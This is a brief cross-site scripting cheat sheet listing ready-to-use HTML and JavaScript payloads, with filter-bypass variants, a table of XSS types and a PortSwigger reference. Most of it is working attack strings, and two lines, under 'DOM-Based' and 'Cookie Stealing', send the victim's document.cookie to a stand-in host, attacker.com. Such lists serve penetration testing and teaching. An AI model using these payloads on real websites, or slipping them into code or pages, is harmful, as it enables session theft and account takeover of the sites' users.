# XSS (Cross-Site Scripting) Cheatsheet

## Basic Payloads
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
```

## Filter Bypass
```html
<ScRiPt>alert('XSS')</sCrIpT>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
<a href="javascript:alert('XSS')">click</a>
<iframe src="javascript:alert('XSS')">
```

## DOM-Based
```javascript
document.location='http://attacker.com/?c='+document.cookie
```

## Cookie Stealing
```javascript
new Image().src='http://attacker.com/?c='+document.cookie;
```

## Types
| Type | Where | Persistence |
|------|-------|-------------|
| Reflected | URL parameters | No |
| Stored | Database | Yes |
| DOM-Based | Client-side JS | No |

> Reference: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet